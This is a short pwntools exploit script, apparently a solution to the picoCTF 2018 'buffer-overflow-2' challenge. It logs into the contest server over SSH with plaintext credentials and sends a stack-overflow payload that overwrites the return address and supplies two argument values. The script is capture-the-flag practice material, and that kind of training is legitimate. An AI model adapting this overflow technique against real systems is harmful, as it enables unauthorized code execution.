from pwn import *
local = False

if(local):
	sh= process('./vuln')
	elf = ELF('./vuln')
else:
	s = ssh(host='2018shell1.picoctf.com', user='johnsonkkk' , password='mypasswd')
	sh = s.run('cd /problems/buffer-overflow-2_1_63b4b691601811c553a7c19e367737b9; ./vuln')

print sh.recv()
payload = 'A' * 112 + p32(0x080485cb) + 'C'*4 + p32(0xDEADBEEF) + p32(0xDEADC0DE)
sh.sendline(payload)

print sh.recv()
sh.close()